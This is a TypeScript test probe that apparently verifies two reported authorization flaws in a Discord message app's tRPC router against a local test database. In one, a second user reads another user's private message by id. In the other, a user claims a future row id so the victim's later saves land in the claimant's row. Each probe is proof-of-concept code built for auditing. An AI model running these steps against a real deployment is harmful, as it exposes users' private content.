// Refutation probe for C1/C2: drives the real message tRPC router via createCaller, real Postgres 16.
// Substituted: ~/env.mjs, pusher, Vercel request context. Not part of any suite.
import pg from '../node_modules/.pnpm/pg@8.11.1/node_modules/pg/lib/index.js';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

import messageRouter from '~/server/api/routers/message';

(globalThis as Record<symbol, unknown>)[Symbol.for('@vercel/request-context')] = {
  get: () => ({ waitUntil: (p: Promise<unknown>) => { void p.catch(() => undefined); } }),
};
const pool = new pg.Pool({ host: process.env.PG_SOCKET_DIR, user: 'postgres', database: 'probe', max: 2 });
const q = async (t: string, p: unknown[] = []) => (await pool.query(t, p)).rows;

// The real getPostgres() reads DATABASE_URL (set by the runner).
const { getPostgres } = await import('project-utils');
const caller = (discordId: string | null) => messageRouter.createCaller({
  session: discordId ? { user: { id: discordId, guilds: [] }, expires: 'x' } : null,
  database: getPostgres(), req: {} as never,
} as never);
const A = caller('111'); // victim / owner, db user 1
const B = caller('222'); // other user, db user 2
const DATA = (c: string) => ({ content: c, embeds: [], components: [] });
const log = (...a: unknown[]) => console.log('PROBE', ...a.map((x) => (typeof x === 'string' ? x : JSON.stringify(x))));

beforeAll(async () => {
  vi.spyOn(console, 'error').mockImplementation(() => undefined);
  await q('create table "Guilds" (id bigserial primary key, "guildId" text, provider text)');
  await q(`create table "Accounts" (id bigserial primary key, "userId" bigint not null, provider text not null, "providerAccountId" text not null)`);
  await q(`create table "Messages" (
    id bigserial primary key, fk_users_id bigint, fk_guilds_id bigint, "previewImageNonce" text,
    "recentWebhookId" text, "recentThreadId" text, "recentMessageId" text,
    "createdAt" timestamp(3) not null default current_timestamp, "updatedAt" timestamp(3) not null,
    name text not null, data jsonb not null, position integer not null default 0, valid boolean)`);
  await q(`create table "ScheduledMessages" (
    id bigserial primary key, fk_guilds_id bigint not null, fk_messages_id bigint unique not null, "webhookUrl" text not null,
    "createdAt" timestamp(3) not null default current_timestamp, "updatedAt" timestamp(3) not null, cron text,
    "sendAt" timestamp(3) not null, sent boolean not null default false, error text)`);
  await q(`insert into "Accounts" ("userId", provider, "providerAccountId") values (1,'discord','111'),(2,'discord','222')`);
});
afterAll(async () => { await pool.end(); });

const err = async (p: Promise<unknown>) => { try { await p; return null; } catch (e) { return `${(e as { code?: string }).code}: ${(e as Error).message}`; } };

describe('C1', () => {
  it('B reads A personal message by id via message.getOne', async () => {
    const mine = await A.upsert({ message: { name: 'A-private', data: DATA('A SECRET CONTENT') } as never });
    log('C1 A saved personal message id', mine.id);
    const rows = await q('select id, fk_users_id, fk_guilds_id from "Messages" where id=$1', [mine.id]);
    log('C1 row owner/guild', rows[0]);
    const got = await err(B.getOne(mine.id));
    if (got) log('C1 B getOne error', got); else {
      const r = await B.getOne(mine.id);
      log('C1 B getOne returned', { id: r?.id, name: r?.name, data: r?.data });
    }
    // controls
    log('C1 control unauthenticated getOne', await err(caller(null).getOne(mine.id)));
    log('C1 control B upsert-with-A-id (ownership check path)', await err(B.upsert({ message: { id: mine.id, name: 'x', data: DATA('x') } as never })));
    log('C1 control B delete A id', await err(B.delete({ id: mine.id })));
    log('C1 control B getOne nonexistent', await err(B.getOne('999999')));
    log('C1 control B get("0") list own', (await B.get('0')).length);
  });
});

describe('C2', () => {
  it('claim a future id, sequence reaches it, victim lands in claimant row', async () => {
    await q('truncate "Messages" restart identity'); // sequence back to 1, as a fresh table
    const seq0 = await q(`select last_value, is_called from "Messages_id_seq"`);
    log('C2 sequence at start', seq0[0]);
    const claim = await err(B.upsert({ message: { id: '3', name: 'B-claim', data: DATA('B CLAIM') } as never }));
    log('C2 B upsert id=3 (nonexistent) error', claim);
    log('C2 rows after claim', await q('select id, fk_users_id, name, data from "Messages" order by id'));
    log('C2 sequence after claim', (await q(`select last_value, is_called from "Messages_id_seq"`))[0]);
    const ids: string[] = [];
    for (let i = 1; i <= 3; i++) {
      const e = await err(A.upsert({ message: { name: `A-new-${i}`, data: DATA(`A SECRET ${i}`) } as never }).then((r) => { ids.push(r.id); }));
      log(`C2 A new save #${i}`, e ?? `returned id ${ids.at(-1)}`);
    }
    log('C2 rows after victim saves', await q('select id, fk_users_id, name, data from "Messages" order by id'));
    const r = await err(B.getOne('3').then((m) => log('C2 B getOne(3) reads', { name: m?.name, data: m?.data })));
    if (r) log('C2 B getOne(3) error', r);
    log('C2 victim re-save of id 3 (own content)', await err(A.upsert({ message: { id: '3', name: 'A-edit', data: DATA('A EDIT') } as never })));
    log('C2 victim getAll ids', (await A.getAll()).map((m) => m.id));
    log('C2 claimant getAll ids', (await B.getAll()).map((m) => m.id));
    log('C2 victim delete 3', await err(A.delete({ id: '3' })));
  });
});
